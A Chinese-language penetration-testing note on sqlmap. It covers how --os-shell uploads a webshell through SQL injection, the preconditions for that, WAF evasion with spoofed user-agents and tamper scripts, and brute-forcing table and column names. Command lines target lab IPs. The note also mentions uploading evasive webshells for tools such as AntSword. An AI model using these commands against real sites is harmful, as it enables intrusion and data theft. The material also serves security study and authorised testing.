### sqlmap --os-shell的原理是什么?

```
参考连接:
	https://www.cnblogs.com/lcamry/p/5505110.html
1、sqlmap会先上传一个小马到网站更目录，大致内容为
limit 0,1 into outfile '路径/写入的木马名称' lines terminated by 跟上需要上传的内容的16进制
	
	该小马会进行一个php版本判断然后对上传的文件权限进行修改
2、sqlmap接着会通过上传的小马上传一个命令执行的文件，该文件中使用is_callable对php.ini配置文件中的disable_function内容进行了检测，如果某些命令函数被禁用，就是使用别的命令执行函数
```

条件:

```
（1）secure-file-priv 为空，不是为null，null表示mysql禁止导入和导出，如果为/tmp/也不行，这样只允许在mysql/tmp/目录下进行导入和导出

（2）网站必须是root权限

（3）攻击者需要知道网站的绝对路径

（4） magic_qutos_gpc为off，php主动转义的功能关闭，并且没有对传入的参数使用addslashes等函数进行转义
```

### sqlmap 扫描https网站

``` 
因为目标站是https 我加了--force-ssl参数 指定为https，但是显示https 连接出错。

因为sqlmap没办法忽略https证书 所以有两个解决方法
    1. 通过本地代理端口进行访问
    2. 通过搭建web，访问代理文件进行注入
    sqlmap.py -u "" -p xx --force-ssl --proxy http://127.0.0.1 4780 (通过本地代理端口)
```



#### 1、隐藏SqlMap指纹信息

**SqlMap默认user-agent为sqlmap.org，防止waf检测，可以自定义user-agent，或者使用随机user-agent**
```java
--user-agent="Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
--random-agent 这样会随机随机指定user-agent在这个文件(txt/user-agents.txt)里面
```
#### 2、使用tamper脚本指定绕过的类型
```java
--tamper=versionedkeywords.py   space2morecomment.py space2mssqlhash.py(常用的)
space2comment.py 		就是注释代替空格
space2morecomment.py	将空格用 /_/ 替代
versionedkeywords.py    对不是函数的关键字进行注释
space2mssqlhash.py		用 # 加一个换行符替换 payload 中的空格
```
#### 3、更改tamper脚本绕过waf


### 暴力破解列名
```java
暴力破解表名 参数：--common-tables
	当使用--tables无法获取到数据库的表时，可以使用此参数。
	通常是如下情况：
		1、MySQL数据库版本小于5.0，没有information_schema数据库。
		2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。
		3、当前用户没有权限读取系统中保存数据结构的表的权限。
		暴力破解的表在sqlmap/txt/common-tables.txt的文件中，可以对字典进行添加，使得字典更加强大。
		4、时间盲注、
		5、布尔盲注、
参数：--common-columns
	与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。
	Xx  --common-columns  -T text -D testdb
	Xx  --common-tables -D testdb
	python27 sqlmap.py -u "http://192.168.244.131:8083/show.asp ?pkid=4820" -T admin --common-columns
```

### 命令执行
**调用shell**
**参数：
 sql-shell,--os-shell**

**--os-shell 执行系统命令**
**--os-shell的执行条件有四个**

```java
（1）网站必须是root权限/拥有file权限(因为会上传文件到网站根目录)
（2）攻击者需要知道网站的绝对路径
（3）GPC为off，php主动转义的功能关闭
（4）secure_file_priv参数不能为NULL状态

	--os-shell需要先执行 --udf-inject 上传两个脚本文件(udf、inject)(mysqludf提权sqlmap中也可以调用)
	
	--os-shell（需要指网站绝对路径(也就是说需要知道网站根目），
	使用--os-shell命令sqlmap会上传两个脚本文件
	(一个用来上传任意文件、一个用来执行os命令行)
	tmpugbftp.php ——>任意上传文件的后门，可以上传一句话(这个脚本和小马差不多)	
	tmpbdhnt.php  ——>用来执行命令的脚本（直接在sqlmap调用命令行）
	
	访问路径即可上马:	http://192.168.149.181:8081/tmpugbftp.php 
	上传大马(免杀)之后然后使用菜刀、冰蝎、蚁剑连接即可 (连接的时候POST参数要大写、POST[XX] 和传入的参数相同)
	如果无法上传(没法上传)  可以选择别的路径、一定需要是root权限，其次需要看系统上linux还是windows，是否有被降权
	#有的网站根目录是没有上传权限的我们可以将文件上传到 (图片上传目录、写日志的地方、数据库修改路径)
```
**--sql-shell 执行sql查询命令**
```java
  --sql-shell 执行sql查询命令，连写文件的权限都没有
	读文件   select load_file('/var/www/html/xycmsphp/index.php')
	连写文件的权限都没有，感觉没啥用
```
**--time-sec 设置注入延时时间**

```java
--time-sec 9 
python sqlmap.py -u "xxxx.com.php?id=1" --random-agent --technique=BT --sql-shell --time-sec 10
有的web程序会在多次错误访问后屏蔽所有请求，这样就导致之后所有的测试无法进行，绕过这个策略可以使用--safe-url，每隔一段时间去访问一个正常的页面。
```
**WAF绕过注入**
	注入点:http://192.168.159.1/news.php?id=1
	sqlmap -u http://192.168.159.1/news.php?id=1 -v 3 --dbs  --batch --tamper "space2morehash.py"
	space2hash.py   base64encode.py charencode.py
**改tamper过waf**

```java
更改tamper脚本，加载更改tamper脚本过狗扫描
未完待续.....
```

